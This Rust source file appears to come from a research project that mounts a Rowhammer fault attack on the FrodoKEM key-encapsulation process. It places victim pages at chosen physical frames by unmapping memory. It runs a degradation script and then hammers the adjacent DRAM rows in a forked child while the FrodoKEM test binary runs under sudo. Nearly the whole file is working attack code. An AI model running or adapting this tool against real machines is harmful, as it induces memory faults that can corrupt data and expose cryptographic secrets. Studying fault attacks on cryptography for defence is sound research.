use core::ffi::c_void;

use std::{
    fs::File,
    io::{self, BufRead, BufReader, Write},
    path::Path,
    process::{self, Command},
    thread,
    time::Duration,
};

use nix::{
    sched::{sched_setaffinity, CpuSet},
    sys::mman::munmap,
    unistd::{fork, ForkResult, Pid},
};

use crate::profiler::{
    pagefinder::{get_candidate_pages, PageCandidate},
    utils::{
        self, collect_pages_by_row, fill_memory, get_block_by_order, rowhammer, setup_mapping,
    },
};

fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64, u64)), String> {
    let file = File::open(input_path).expect("Failed to open file.");

    for line in BufReader::new(file).lines() {
        let line = line.expect("Error when reading line in file.");

        if !line.starts_with(">") {
            continue;
        }

        let p = line[1..]
            .split_whitespace()
            .take(5)
            .map(|s| {
                u64::from_str_radix(
                    match s.strip_prefix("0x") {
                        Some(s) => s,
                        None => s,
                    },
                    16,
                )
                .expect("Failed to parse hexstring in input file to u64")
            })
            .collect::<Vec<_>>();

        return Ok((p[0], (p[1], p[2]), (p[3], p[4])));
    }

    Err(String::from("Couldnt parse pfns from file"))
}

fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
    println!("Initializing pages for attack.");

    for page in &pages {
        unsafe {
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.0.virt_addr,
                page.below_pages.0.virt_addr,
            );
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.1.virt_addr,
                page.below_pages.1.virt_addr,
            );
        }
    }

    let mut block_mapping = get_block_by_order(12);

    println!("Starting attack");
    io::stdout().flush().unwrap();

    match unsafe { fork() } {
        Ok(ForkResult::Parent { child }) => {
            println!("Started attack in child process {}", child);

            let ok = Command::new("./src/degradation/run_degradation.sh")
                .status()
                .expect("Running degradation failed");

            thread::sleep(Duration::from_secs(10));

            // Set Cpu affinity to core 1
            let mut cpu_set = CpuSet::new();
            cpu_set.set(1).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Unmap all allocated pages to make room for the FrodoKEM process
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            let ptr = block_mapping.as_mut_ptr();
            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
                unsafe {
                    munmap(
                        ptr.add(utils::PAGE_SIZE * offset) as *mut c_void,
                        utils::PAGE_SIZE,
                    )
                    .expect(&format!(
                        "Address: {:?} should be mapped",
                        ptr.add(utils::PAGE_SIZE * offset)
                    ));
                }
            }

            for page in &pages {
                unsafe {
                    munmap(page.target_page.virt_addr as *mut c_void, utils::PAGE_SIZE).expect(
                        &format!("Address: {:?} should be mapped", page.target_page.virt_addr),
                    );
                }
            }

            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
                unsafe {
                    munmap(
                        ptr.add(utils::PAGE_SIZE * offset) as *mut c_void,
                        utils::PAGE_SIZE,
                    )
                    .expect(&format!(
                        "Address: {:?} should be mapped",
                        ptr.add(utils::PAGE_SIZE * offset)
                    ));
                }
            }

            let ok = Command::new("sudo")
                .arg("../Frodo/PQCrypto-LWEKE/frodo640/test_KEM > vic.out")
                .status()
                .expect("failed to execute command");

            println!("FrodoKEM process exited with: {}", ok);
            thread::sleep(Duration::from_secs(5));

            println!("Killing child process {}", child);
            let ok = Command::new("sudo")
                .arg("kill")
                .arg("-9")
                .arg(format!("{}", child))
                .status()
                .expect("failed to kill child, sorry master :(");

            println!("Killing degradations...");
            let ok = Command::new("sudo")
                .arg("pkill")
                .arg("-f")
                .arg("degrade")
                .status()
                .expect("failed to kill degradations");
        }

        Ok(ForkResult::Child) => {
            println!("Running attack");

            // Setting Cpu affinity to core 1
            let mut cpu_set = CpuSet::new();
            cpu_set.set(5).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Set values to allocated memory before attacking
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            let ptr = block_mapping.as_mut_ptr();
            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
                unsafe {
                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                }
            }

            for (i, page) in pages.iter().enumerate() {
                unsafe {
                    std::ptr::write_bytes(
                        page.target_page.virt_addr,
                        i as u8 & 0xFF,
                        utils::PAGE_SIZE,
                    )
                }
            }

            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
                unsafe {
                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                }
            }

            while hammer {
                for page in &pages {
                    rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
                }
            }
        }
        Err(_) => {
            println!("Failed to fork process");
            process::exit(1);
        }
    }

    println!("Done with attack");
}

pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
    let row_size = 128 * 1024 * dimms as usize;
    let mut mmap = setup_mapping(0.0);

    let mut hammer = true;

    if testing {
        hammer = false;
    }

    let mut victim_pfns = Vec::new();
    victim_pfns.push("0x3b4bf1");
    victim_pfns.push("0x3dd31e");
    victim_pfns.push("0x400b3a");

    let mut victim_pages = Vec::new();

    for pfn in &victim_pfns {
        let file = format!("data/V_{}.out", pfn);
        victim_pages.push(get_page_pfns(file).unwrap());
    }

    println!("Setting up memory mapping...");
    let (pagemap, pages_by_row, victims) = loop {
        std::mem::drop(mmap);
        mmap = setup_mapping(fraction_of_phys_memory);

        println!("Collecting all pages in all rows...");
        let pages_by_row = collect_pages_by_row(&mut mmap, row_size).unwrap();

        if pages_by_row.len() < 3 {
            eprintln!(
                "[!] Can't hammer rows - only got {} rows total. Make sure you're running as sudo!",
                pages_by_row.len()
            );

            ()
        }

        let victims = get_candidate_pages(&pages_by_row, &victim_pages);

        if victims.len() != victim_pfns.len() {
            println!("Couldn't find all victim pages in mapping, Remapping!");
            continue;
        }

        break (mmap, pages_by_row, victims);
    };

    let mut indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();

    'main: for above_row_index in indices {
        let target_row_index = above_row_index + 1;
        let below_row_index = above_row_index + 2;

        let above_row = &pages_by_row[above_row_index];
        let target_row = &pages_by_row[target_row_index];
        let below_row = &pages_by_row[below_row_index];

        // If any of the rows are not full we can't hammer them, so continue to the next iteration
        for i in 0..3 {
            if pages_by_row[above_row_index + i].len() != row_size as usize / utils::PAGE_SIZE {
                continue 'main;
            }
        }
    }

    rowhammer_attack(hammer, victims);

    println!("Done with attack");
}
